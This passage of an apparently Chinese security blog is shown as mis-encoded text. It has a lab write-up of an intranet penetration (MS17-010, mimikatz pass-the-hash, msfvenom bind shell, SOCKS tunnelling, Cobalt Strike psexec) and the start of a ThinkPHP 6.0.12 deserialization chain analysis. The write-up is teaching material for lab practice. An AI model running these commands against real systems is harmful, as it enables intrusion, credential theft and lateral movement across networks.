æŸ¥çœ‹åŸŸé‡Œé¢çš„å·¥ä½œç»„ï¼ŒæŸ¥çœ‹æŠŠç”¨æˆ·åˆ†äº†å¤šå°‘ç»„ï¼ˆåªèƒ½åœ¨åŸŸæ§ä¸Šæ“ä½œï¼‰</span><br><span class="line">net time /domain    #åˆ¤æ–­ä¸»åŸŸï¼Œä¸»åŸŸæœåŠ¡å™¨ä¸€èˆ¬åšæ—¶é—´æœåŠ¡å™¨</span><br><span class="line">net group ç»„å /domain    # æŸ¥çœ‹åŸŸä¸­æŸå·¥ä½œç»„</span><br><span class="line">net group &quot;domain admins&quot; /domain  # æŸ¥çœ‹åŸŸç®¡ç†å‘˜çš„åå­—</span><br><span class="line">net group &quot;domain computers&quot; /domain  # æŸ¥çœ‹åŸŸä¸­çš„å…¶ä»–ä¸»æœºå</span><br><span class="line">net group &quot;domain controllers&quot; /domain  # æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ä¸»æœºåï¼ˆå¯èƒ½æœ‰å¤šå°ï¼‰</span><br><span class="line">ipconfig /all #æŸ¥è¯¢æœ¬æœºIPæ®µï¼Œæ‰€åœ¨åŸŸç­‰</span><br></pre></td></tr></table></figure><p><code>net view</code>ï¼š</p><p><a href="/images/62bf4a891d64b07066dc9fc2.jpg" title="image-20220701172233614" class="gallery-item"><img src="/images/62bf4a891d64b07066dc9fc2.jpg" alt="image-20220701172233614"></a></p><p><code>net config Workstation</code>ï¼š</p><p><a href="/images/62bf4a951d64b07066dca9e1.jpg" title="image-20220701172322585" class="gallery-item"><img src="/images/62bf4a951d64b07066dca9e1.jpg" alt="image-20220701172322585"></a></p><p>å¯ä»¥çœ‹åˆ°ç™»é™†åŸŸä¸ºGODï¼Œè®¡ç®—æœºåä¸ºSTU1ã€‚</p><p><code>net user</code>ï¼š</p><p><a href="/images/62bf4aa61d64b07066dcb6f5.jpg" title="image-20220701172424042" class="gallery-item"><img src="/images/62bf4aa61d64b07066dcb6f5.jpg" alt="image-20220701172424042"></a></p><p><code>net user /domain</code>ï¼š</p><p><a href="/images/62bf4ab51d64b07066dcc315.jpg" title="image-20220701172506188" class="gallery-item"><img src="/images/62bf4ab51d64b07066dcc315.jpg" alt="image-20220701172506188"></a></p><p><code>net localgroup administrators</code>ï¼š</p><p><a href="/images/62bf4ac01d64b07066dccad9.jpg" title="image-20220701172731217" class="gallery-item"><img src="/images/62bf4ac01d64b07066dccad9.jpg" alt="image-20220701172731217"></a></p><p><code>net view /domain</code>ï¼š</p><p><a href="/images/62bf4acc1d64b07066dcd4a8.jpg" title="image-20220701172803499" class="gallery-item"><img src="/images/62bf4acc1d64b07066dcd4a8.jpg" alt="image-20220701172803499"></a></p><p>åªæœ‰ä¸€ä¸ªGODåŸŸã€‚</p><p><code>net user Administrator /domain</code>ï¼š</p><p><a href="/images/62bf4ad61d64b07066dcdc79.jpg" title="image-20220701172953199" class="gallery-item"><img src="/images/62bf4ad61d64b07066dcdc79.jpg" alt="image-20220701172953199"></a></p><p><code>net group &quot;domain admins&quot; /domain</code>ï¼š</p><p><a href="/images/62bf4ae71d64b07066dce805.jpg" title="image-20220701173128166" class="gallery-item"><img src="/images/62bf4ae71d64b07066dce805.jpg" alt="image-20220701173128166"></a></p><p>å¯ä»¥çœ‹åˆ°Administratorä¸ºåŸŸç®¡ã€‚</p><p><code>net group &quot;domain controllers &quot; /domain</code>ï¼š</p><p><a href="/images/62bf4af81d64b07066dcf522.jpg" title="image-20220701173317196" class="gallery-item"><img src="/images/62bf4af81d64b07066dcf522.jpg" alt="image-20220701173317196"></a></p><p>DCä¸ºOWAè¿™å°ä¸»æœºã€‚</p><p><code>ipconfig /all</code>ï¼š</p><p><a href="/images/62bf4b041d64b07066dcfdb1.jpg" title="image-20220701182815869" class="gallery-item"><img src="/images/62bf4b041d64b07066dcfdb1.jpg" alt="image-20220701182815869"></a></p><p>å¯ä»¥å¾—çŸ¥è¿™å°ä¸»æœºçš„å†…ç½‘IPä¸º192.168.52.143ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨nmapæ¥æ‰«æä¸€æ³¢å†…ç½‘ï¼ˆè¿™å°ä¸»æœºå†…ç½®nmapäº†ï¼‰ï¼š</p><p><a href="/images/62bf4b121d64b07066dd07ce.jpg" title="image-20220701183124997" class="gallery-item"><img src="/images/62bf4b121d64b07066dd07ce.jpg" alt="image-20220701183124997"></a></p><p>æ‹¿åˆ°å†…ç½‘çš„å¦å¤–ä¸¤å°ä¸»æœºçš„IPä¸º192.168.52.138å’Œ192.168.52.141ã€‚</p><h3 id="å†…ç½‘çªç ´"><a href="#å†…ç½‘çªç ´" class="headerlink" title="å†…ç½‘çªç ´"></a>å†…ç½‘çªç ´</h3><p>æ¥ä¸‹æ¥å¯¹è¿™ä¸¤ä¸ªå†…ç½‘ä¸»æœºçš„æ¸—é€éƒ½åŸºæœ¬ä¾æ‰˜æ”»å‡»æœºçš„msfå®Œæˆï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œç›´æ¥åœ¨msfä¸­æ·»åŠ è·¯ç”±æ¥ä½¿æ”»å‡»æœºå¯ä»¥è®¿é—®åˆ°å†…ç½‘èµ„æºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.52.0/24</span><br></pre></td></tr></table></figure><p><a href="/images/62bf4b221d64b07066dd131f.jpg" title="image-20220701195219880" class="gallery-item"><img src="/images/62bf4b221d64b07066dd131f.jpg" alt="image-20220701195219880"></a></p><p>æ¥ç€æˆ‘ä»¬å°è¯•æ‰«ææ°¸æ’ä¹‹è“ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><a href="/images/62bf4b2c1d64b07066dd1a11.jpg" title="image-20220701195513265" class="gallery-item"><img src="/images/62bf4b2c1d64b07066dd1a11.jpg" alt="image-20220701195513265"></a></p><p>445ç«¯å£å¼€å¯ï¼Œå­˜åœ¨smbæœåŠ¡ï¼Œçœ‹çœ‹æ˜¯å¦å­˜åœ¨æ°¸æ’ä¹‹è“ï¼š</p><p><a href="/images/62bf4b361d64b07066dd2104.jpg" title="image-20220701195636083" class="gallery-item"><img src="/images/62bf4b361d64b07066dd2104.jpg" alt="image-20220701195636083"></a></p><p>å¾ˆæœ‰å¯èƒ½å­˜åœ¨ï¼Œé‚£æˆ‘ä»¬å°è¯•æ‰“ä¸€ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">options</span><br><span class="line">set command whoami</span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><a href="/images/62bf4b571d64b07066dd3a41.jpg" title="image-20220701211222844" class="gallery-item"><img src="/images/62bf4b571d64b07066dd3a41.jpg" alt="image-20220701211222844"></a></p><p>æˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼é‚£æˆ‘ä»¬æ¥ä¸‹æ¥å†çœ‹ä¸€ä¸‹è¿™å°ä¸»æœºçš„ç«¯å£ï¼Œå¾ˆç®€å•ï¼Œåªéœ€è¦å°†commandå‚æ•°æ”¹ä¸º<code>netstat -na</code>ç»§ç»­runä¸€ä¸‹å°±å¯ä»¥äº†ï¼š</p><p><a href="/images/62bf4b641d64b07066dd4486.jpg" title="image-20220701211350099" class="gallery-item"><img src="/images/62bf4b641d64b07066dd4486.jpg" alt="image-20220701211350099"></a></p><p>å¹¶æœªå‘ç°3389ç«¯å£ï¼Œé‚£æˆ‘ä»¬å†åˆ©ç”¨å¦‚ä¸‹å‘½ä»¤å†å¼€ä¸€ä¸‹3389ç«¯å£ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\&quot; \&quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure><p><a href="/images/62bf4b801d64b07066dd5b2e.jpg" title="image-20220701212047024" class="gallery-item"><img src="/images/62bf4b801d64b07066dd5b2e.jpg" alt="image-20220701212047024"></a></p><p>æ¥ç€å†æŸ¥çœ‹ä¸€ä¸‹ç«¯å£ï¼š</p><p><a href="/images/62bf4b891d64b07066dd621e.jpg" title="image-20220701212102819" class="gallery-item"><img src="/images/62bf4b891d64b07066dd621e.jpg" alt="image-20220701212102819"></a></p><p>3389ç«¯å£è¢«æˆåŠŸæ‰“å¼€ï¼Œæ¥ç€å°±æ˜¯è¦å¼€å¯è¿œç¨‹æ¡Œé¢äº†ã€‚ä½†æ˜¯è¿™å°ä¸»æœºå¹¶ä¸èƒ½è®¿é—®å¤–ç½‘ï¼Œå› æ­¤ä¸èƒ½è®¿é—®æˆ‘ä»¬çš„æ”»å‡»æœºã€‚è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨åˆ«çš„å¸ˆå‚…æåˆ°çš„<a href="https://www.freebuf.com/articles/network/275436.html">éšè—é€šä¿¡éš§é“æŠ€æœ¯</a>ï¼Œå€ŸåŠ©é‚£å°win7ä½œä¸ºè·³æ¿æœºå®Œæˆå†…ç½‘ç©¿é€ã€‚</p><p>å°†ew_for_win32.exeç»™Win7ä¸Šä¼ ä¸Šå»ï¼Œæ¥ç€åœ¨æˆ‘ä»¬æ”»å‡»æœºæœ¬åœ°æ·»åŠ è½¬æ¥éš§é“ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux -s rcsocks -l 1080 -e 4444 #è¦å…ˆæŠŠ4444ç«¯å£ç»™æ‰“å¼€</span><br></pre></td></tr></table></figure><p>æ¥ç€åœ¨Win7ä¸­æ‰§è¡Œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_win_32.exe -s rssocks -d 192.168.229.133 -e 4444</span><br></pre></td></tr></table></figure><p><a href="/images/62bf4b9c1d64b07066dd6edf.jpg" title="image-20220701212740562" class="gallery-item"><img src="/images/62bf4b9c1d64b07066dd6edf.jpg" alt="image-20220701212740562"></a></p><p>éš§é“æ­å»ºæˆåŠŸã€‚æ¥ä¸‹æ¥æˆ‘ä»¬ä¿®æ”¹proxychains4.confæ·»åŠ å¦‚ä¸‹ä»£ç†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5  192.168.229.133 1080</span><br></pre></td></tr></table></figure><p>ä¿å­˜å¹¶é€€å‡ºåæ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop 192.168.52.141</span><br></pre></td></tr></table></figure><p><a href="/images/62bf4ba61d64b07066dd761d.jpg" title="image-20220701213408165" class="gallery-item"><img src="/images/62bf4ba61d64b07066dd761d.jpg" alt="image-20220701213408165"></a></p><p>ä½¿ç”¨ä¹‹å‰æ‹¿åˆ°çš„åŸŸç®¡çš„è´¦å·ï¼ŒæˆåŠŸç™»é™†ï¼æ‹¿ä¸‹192.168.52.141ï¼š</p><p><a href="/images/62bf4bb01d64b07066dd7e9f.jpg" title="image-20220701213500383" class="gallery-item"><img src="/images/62bf4bb01d64b07066dd7e9f.jpg" alt="image-20220701213500383"></a></p><p>æ¥ç€æˆ‘ä»¬å¼€å§‹æ‰“192.168.52.138ï¼Œä½†æ˜¯è¿™å°ä¸»æœºåˆ©ç”¨åˆšåˆšä¸Šé¢çš„æ–¹æ³•ï¼Œå´æ— æ³•æ‹¿åˆ°è¿œç¨‹æ¡Œé¢ã€‚</p><p><a href="/images/62bf4bbc1d64b07066dd878c.jpg" title="image-20220701214410519" class="gallery-item"><img src="/images/62bf4bbc1d64b07066dd878c.jpg" alt="image-20220701214410519"></a></p><p>ä¸€ç›´è¿æ¥ä¸ä¸Šã€‚å°è¯•æ‹¿Win7é‚£å°nmapæ‰«ä¸€ä¸‹192.168.52.138è¿™å°ï¼Œæ‰å‘ç°3389ç»™è®¾ç½®äº†é˜²ç«å¢™ï¼š</p><p><a href="/images/62bf4bc91d64b07066dd919a.jpg" title="image-20220701220224803" class="gallery-item"><img src="/images/62bf4bc91d64b07066dd919a.jpg" alt="image-20220701220224803"></a></p><p>é‚£è¿™å°çœ‹æ¥ç¡®å®æ˜¯æ²¡æ³•æ‹¿åˆ°è¿œç¨‹æ¡Œé¢äº†ã€‚é™¤éæ˜¯è¿›å»ç»™ä»–é˜²ç«å¢™å…³äº†ï¼š</p><p><a href="/images/62bf4bdb1d64b07066dd9e02.jpg" title="image-20220701220729492" class="gallery-item"><img src="/images/62bf4bdb1d64b07066dd9e02.jpg" alt="image-20220701220729492"></a></p><p>è¿™ä¸‹å†å°è¯•åˆ©ç”¨åˆšåˆšçš„æ–¹æ³•æ‹¿è¿œç¨‹æ¡Œé¢å°±èƒ½æ‹¿åˆ°äº†ï¼š</p><p><a href="/images/62bf4be51d64b07066dda4f6.jpg" title="image-20220701220711892" class="gallery-item"><img src="/images/62bf4be51d64b07066dda4f6.jpg" alt="image-20220701220711892"></a></p><p>ä½†æ˜¯è¿™å¾ˆæ˜æ˜¾æ²¡ä»€ä¹ˆæ„æ€ï¼Œé‚£æˆ‘ä»¬ å°±æ¢ä¸ªæ€è·¯æ‰“å®ƒï¼Œè¯•ä¸€ä¸‹ä¹‹å‰ç”¨mimikatzæŠ“å–çš„å“ˆå¸Œå€¼è¿›è¡Œå“ˆå¸Œä¼ é€’ç™»å½•åŸŸæ§ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">sekurlsa::pth /domain:god.org /user:administrator /ntlm:your_ntml_hash</span><br></pre></td></tr></table></figure><p>å°è¯•è®¿é—®åŸŸæ§å…±äº«æœåŠ¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.52.138\c$</span><br></pre></td></tr></table></figure><p><a href="/images/62bf4bf91d64b07066ddb160.jpg" title="image-20220702022902556" class="gallery-item"><img src="/images/62bf4bf91d64b07066ddb160.jpg" alt="image-20220702022902556"></a></p><p>è®¿é—®æˆåŠŸã€‚å› ä¸º192.168.52.138è¿™å°ä¸å‡ºç½‘ï¼Œä½†æ˜¯åˆå› ä¸ºæˆ‘ä»¬åˆšåˆšå·²ç»è®¾ç½®è·¯ç”±ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ­£å‘è¿æ¥æ¥æ‹¿shellã€‚é¦–å…ˆæ„é€ ä¸ªæ­£å‘è¿æ¥çš„æ”»å‡»è½½è·ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp  LPORT=456 -f exe -o xxx.exe</span><br></pre></td></tr></table></figure><p>æ¥ç€æˆ‘ä»¬å°†è¿™ä¸ªxxx.exeä¼ å…¥Win7é‚£å°æœºå™¨ï¼Œå¹¶ä»Win7ä¼ åˆ°192.168.52.138ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload xxx.exe C:\\</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">C:\&gt;copy xxx.exe \\192.168.52.138\C$</span><br><span class="line">C:\&gt;schtasks /create /tn &quot;evil_task&quot; /tr C:\yyy.exe /sc once /st 12:00 /S 192.168.52.138 /RU System  /u administrator /p &quot;your_password&quot;</span><br></pre></td></tr></table></figure><p>æ¥ç€åˆ©ç”¨exploit&#x2F;multi&#x2F;handleræ¨¡å—ï¼Œè®¾ç½®payloadä¸ºwindows&#x2F;meterpreter&#x2F;bind_tcpï¼Œè®¾ç½®å¥½rhostå’Œlportï¼Œç„¶årunå°±å¯ä»¥äº†ï¼š</p><p><a href="/images/62bf4c041d64b07066ddb7ca.jpg" title="image-20220702025146824" class="gallery-item"><img src="/images/62bf4c041d64b07066ddb7ca.jpg" alt="image-20220702025146824"></a></p><p>è‡³æ­¤ï¼ŒMSFæ­£å¼æ‰“å®Œï¼</p><h2 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h2><h3 id="ä¸Šçº¿CS"><a href="#ä¸Šçº¿CS" class="headerlink" title="ä¸Šçº¿CS"></a>ä¸Šçº¿CS</h3><p>åˆ©ç”¨http listennerç”Ÿæˆä¸€ä¸ªpayloadï¼Œç„¶åæ”¾åˆ°èšå‰‘é‚£é‡Œå»æ‰§è¡Œä»¥ä¸‹ï¼š</p><p><a href="/images/62bf4c141d64b07066ddc2e7.jpg" title="image-20220702025559691" class="gallery-item"><img src="/images/62bf4c141d64b07066ddc2e7.jpg" alt="image-20220702025559691"></a></p><p>æˆåŠŸä¸Šçº¿ï¼š</p><p><a href="/images/62bf4c1d1d64b07066ddcaa0.jpg" title="image-20220702025616044" class="gallery-item"><img src="/images/62bf4c1d1d64b07066ddcaa0.jpg" alt="image-20220702025616044"></a></p><p>åŒæ ·çš„å†…ç½‘ä¿¡æ¯æ”¶é›†å°±ä¸åœ¨è¿™é‡Œå†åˆ—ä¸¾äº†ï¼Œå¯ä»¥å‚è€ƒMSFæ”¶é›†ä¿¡æ¯æ—¶çš„æ­¥éª¤ã€‚å¯¹äº†ï¼Œè®°å¾—ä½¿ç”¨å‘½ä»¤å‰ï¼Œè®¾ç½®ä¸€ä¸‹sleepï¼Œæ¯•ç«Ÿæ˜¯é¶æœºå˜›ï¼Œå¯ä»¥ç¨å¾®å¤§èƒ†ä¸€ç‚¹ã€‚</p><h3 id="å†…ç½‘çªç ´-1"><a href="#å†…ç½‘çªç ´-1" class="headerlink" title="å†…ç½‘çªç ´"></a>å†…ç½‘çªç ´</h3><p>åˆ©ç”¨CSè‡ªå¸¦çš„mimikatzæ‹¿åˆ°æ˜æ–‡å¯†ç ï¼š</p><p><a href="/images/62bf4c291d64b07066ddd2a8.jpg" title="image-20220702030022084" class="gallery-item"><img src="/images/62bf4c291d64b07066ddd2a8.jpg" alt="image-20220702030022084"></a></p><p><a href="/images/62bf4c331d64b07066ddda54.jpg" title="image-20220702030153351" class="gallery-item"><img src="/images/62bf4c331d64b07066ddda54.jpg" alt="image-20220702030153351"></a></p><p>æ¥ç€æˆ‘ä»¬å¯ä»¥åˆ©ç”¨psexecå’Œåˆšåˆšå¾—åˆ°çš„å¯†ç ï¼Œä¸å†…ç½‘ä¸­åˆ«çš„ä¸»æœºè¿›è¡Œè¿æ¥ï¼š</p><p><a href="/images/62bf4c441d64b07066dde730.jpg" title="image-20220702030315702" class="gallery-item"><img src="/images/62bf4c441d64b07066dde730.jpg" alt="image-20220702030315702"></a></p><p><a href="/images/62bf4c4f1d64b07066ddefd8.jpg" title="image-20220702030354739" class="gallery-item"><img src="/images/62bf4c4f1d64b07066ddefd8.jpg" alt="image-20220702030354739"></a></p><p>å…¶ä¸­ç›‘å¬å™¨è®¾ç½®SMBï¼Œä¼šè¯é€‰æ‹©Win7çš„é‚£å°ã€‚æˆåŠŸè¿æ¥ï¼š</p><p><a href="/images/62bf4c5e1d64b07066ddfb3b.jpg" title="image-20220702030441329" class="gallery-item"><img src="/images/62bf4c5e1d64b07066ddfb3b.jpg" alt="image-20220702030441329"></a></p><p><a href="/images/62bf4c691d64b07066de0731.jpg" title="image-20220702030453713" class="gallery-item"><img src="/images/62bf4c691d64b07066de0731.jpg" alt="image-20220702030453713"></a></p><p>å¯ä»¥çœ‹ä¸€ä¸‹æ–‡ä»¶ç®¡ç†ï¼š</p><p><a href="/images/62bf4c721d64b07066de0de2.jpg" title="image-20220702030519270" class="gallery-item"><img src="/images/62bf4c721d64b07066de0de2.jpg" alt="image-20220702030519270"></a></p><p>å¦å¤–ä¸€å°ä¹Ÿæ˜¯åŒæ ·çš„æ–¹æ³•ï¼ŒæˆåŠŸè¿æ¥ï¼š</p><p><a href="/images/62bf4c7b1d64b07066de149f.jpg" title="image-20220702030618391" class="gallery-item"><img src="/images/62bf4c7b1d64b07066de149f.jpg" alt="image-20220702030618391"></a></p><p>é¡ºä¾¿åˆ©ç”¨æ¢¼æŒæ’ä»¶æ¥ä¸ªå°å¨±ä¹ï¼š</p><p><a href="/images/62bf4c841d64b07066de1b09.jpg" title="image-20220702031636250" class="gallery-item"><img src="/images/62bf4c841d64b07066de1b09.jpg" alt="image-20220702031636250"></a></p><p><a href="/images/62bf4c8c1d64b07066de20b5.jpg" title="image-20220702031657035" class="gallery-item"><img src="/images/62bf4c8c1d64b07066de20b5.jpg" alt="image-20220702031657035"></a></p><p>è‡³æ­¤ï¼Œæ‰“å®Œï¼Œæ”¶å·¥ï¼</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP6.0.12ååºåˆ—åŒ–RCEæŒ–æ˜</title>
      <link href="/2022/06/19/thinkphpAudit/"/>
      <url>/2022/06/19/thinkphpAudit/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨åŠä¸ªæœˆå‰çš„CISCNçº¿ä¸Šåˆèµ›çš„æ—¶å€™ç¢°åˆ°äº†ä¸€é“å…³äºThinkPHP6.0.12LTSååºåˆ—åŒ–æ¼æ´çš„é¢˜ç›®ï¼Œå½“æ—¶è§£é¢˜æ˜¯ç›´æ¥ç”¨çš„ç½‘ä¸Šçš„POCï¼Œæ²¡æœ‰ç»†è‡´çš„ç ”ç©¶è¿™ä¸ªæ¼æ´POPé“¾çš„æŒ–æ˜ï¼Œè¿™ç¯‡æ–‡ç« å°±å¯¹è¿™ä¸ªæ¼æ´è¿›è¡Œä¸€ä¸ªå¤ç°å’Œåˆ†æã€‚</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><ul><li><p>PHP8.0.2</p></li><li><p>thinkphp6.0.12</p></li></ul><p><strong>thinkphp6.0.12ä¸‹è½½ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think tp6  # è‡ªåŠ¨ä¸‹è½½æœ€æ–°ç‰ˆçš„</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œthinkphp6éœ€è¦ç”¨åˆ°php7.1ä»¥ä¸Šæ‰èƒ½ä¸‹è½½ã€‚</p><h2 id="ååºåˆ—åŒ–åˆ†æ"><a href="#ååºåˆ—åŒ–åˆ†æ" class="headerlink" title="ååºåˆ—åŒ–åˆ†æ"></a>ååºåˆ—åŒ–åˆ†æ</h2><p>ååºåˆ—åŒ–çš„å…¥å£ä¸€èˆ¬æ˜¯<code>__wake()</code>ã€<code>__destruct()</code>æˆ–è€…<code>__construct()</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥å…¨å±€æœç´¢ï¼Œå®šä½åˆ°<code>vendor\topthink\think-orm\src\Model.php</code>ï¼š</p><p><a href="/images/62aee6a109475431296c5c06.png" title="image-20220619135204692" class="gallery-item"><img src="/images/62aee6a109475431296c5c06.png" alt="image-20220619135204692"></a></p><p>å¯ä»¥å‘ç°å½“<code>$this-&gt;lazySave</code>ä¸ºtrueæ—¶ï¼Œå°±ä¼šæ‰§è¡Œ<code>$this-&gt;save()</code>ã€‚ç»§ç»­è·Ÿè¿›<code>$this-&gt;save()</code>ï¼š</p><p><a href="/images/62aee6b209475431296c70d7.png" title="image-20220619135706565" class="gallery-item"><img src="/images/62aee6b209475431296c70d7.png" alt="image-20220619135706565"></a></p><p>å…¶ä¸­æ¼æ´æ–¹æ³•ä¸º<code>updateData()</code>ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦å…ˆç»•è¿‡ç¬¬ä¸€ä¸ªifè¯­å¥ï¼š</p><p><a href="/images/62aee6bb09475431296c7d13.png" title="image-20220619135755379" class="gallery-item"><img src="/images/62aee6bb09475431296c7d13.png" alt="image-20220619135755379"></a></p><p>è·Ÿè¿›<code>$this-&gt;isEmpty()</code>æ–¹æ³•ï¼š</p><p><a href="/images/62aee6d009475431296c995a.png" title="image-20220619135854188" class="gallery-item"><img src="/images/62aee6d009475431296c995a.png" alt="image-20220619135854188"></a></p><p>å‘ç°è¿™é‡Œåˆ¤æ–­<code>$this-&gt;data</code>è¿™ä¸ªå˜é‡æ˜¯å¦ä¸ºç©ºï¼Œç»•è¿‡ä¹Ÿå¾ˆç®€å•ï¼Œç»™<code>$this-&gt;data</code>èµ‹å€¼å³å¯ã€‚æ¥ç€è·Ÿè¿›<code>$this-&gt;trigger()</code>ï¼š</p><p><a href="/images/62aee6d909475431296ca4e9.png" title="image-20220619140138544" class="gallery-item"><img src="/images/62aee6d909475431296ca4e9.png" alt="image-20220619140138544"></a></p><p>å‘ç°åªè¦æˆ‘ä»¬å°†<code>$this-&gt;withEvent</code>è®¾ä¸ºfalseï¼Œé‚£ä¹ˆ<code>$this-&gt;trigger()</code>å°±ä¼šè¿”å›trueï¼Œä»è€Œä½¿å¾—<code>false===true</code>ï¼Œç»“æœä¸ºfalseï¼ŒæˆåŠŸç»•è¿‡ifæ¥åˆ°536è¡Œçš„ååºåˆ—åŒ–é“¾æ¼æ´ç‚¹ï¼š</p><p><a href="/images/62aee6e509475431296cb323.png" title="image-20220619140416516" class="gallery-item"><img src="/images/62aee6e509475431296cb323.png" alt="image-20220619140416516"></a></p><p>è¿™é‡Œå°†<code>$this-&gt;exists</code>è®¾ä¸ºtrueå³å¯è°ƒç”¨<code>$this-&gt;updateData</code>æ–¹æ³•ã€‚è·Ÿè¿›<code>$this-&gt;updateData()</code>ï¼š</p><p><a href="/images/62aee6f209475431296cc2c2.png" title="image-20220619140556139" class="gallery-item"><img src="/images/62aee6f209475431296cc2c2.png" alt="image-20220619140556139"></a></p><p>è¿™é‡Œè°ƒç”¨äº†<code>$this-&gt;checkAllowFields()</code>æ–¹æ³•ï¼Œè·Ÿè¿›ä¸€ä¸‹ï¼š</p><p><a href="/images/62aee70309475431296cd695.png" title="image-20220619140704310" class="gallery-item"><img src="/images/62aee70309475431296cd695.png" alt="image-20220619140704310"></a></p><p>è·Ÿè¿›åï¼Œå‘ç°è¿™é‡Œè°ƒç”¨äº†<code>$this-&gt;db()</code>æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›<code>$this-&gt;db</code>æ–¹æ³•ï¼š</p><p><a href="/images/62aee70f09475431296ce4a0.png" title="image-20220619140910082" class="gallery-item"><img src="/images/62aee70f09475431296ce4a0.png" alt="image-20220619140910082"></a></p><p>å‘ç°å¦‚æœ<code>$this-&gt;table</code>ä¸ä¸ºç©ºçš„è¯ï¼Œå°±ä¼šå°†<code>$this-&gt;table</code>ä¸<code>$this-&gt;suffix</code>è¿›è¡Œæ‹¼æ¥ï¼ŒåŒæ—¶è°ƒç”¨tableæ–¹æ³•è¿›è¡Œå¤„ç†ã€‚è¿™é‡Œè¿›è¡Œäº†æ‹¼æ¥æ“ä½œï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å…¨å±€æœç´¢ä¸€ä¸‹æ˜¯å¦æœ‰<code>__toString()</code>æ–¹æ³•ï¼Œè¿™æ ·æˆ‘ä»¬åªéœ€è¦å°†<code>$this-&gt;table</code>å’Œ<code>$this-&gt;suffix</code>å…¶ä¸­ä¸€ä¸ªèµ‹å€¼ä¸º<code>__toString()</code>æ‰€åœ¨çš„ç±»ï¼Œå³å¯è°ƒç”¨è¯¥<code>__toString</code>æ–¹æ³•ã€‚å…¨å±€æœç´¢åï¼Œå®šä½åˆ°vendor\topthink\think-orm\src\model\concern\Conversion.phpï¼š</p><p><a href="/images/62aee72609475431296d024c.png" title="image-20220619141533127" class="gallery-item"><img src="/images/62aee72609475431296d024c.png" alt="image-20220619141533127"></a></p><p>è¿™é‡Œè°ƒç”¨äº†<code>$this-&gt;toJsong()</code>æ–¹æ³•ï¼Œè·Ÿè¿›ä¸€ä¸‹ï¼š</p><p><a href="/images/62aee72f09475431296d0d84.png" title="image-20220619141610797" class="gallery-item"><img src="/images/62aee72f09475431296d0d84.png" 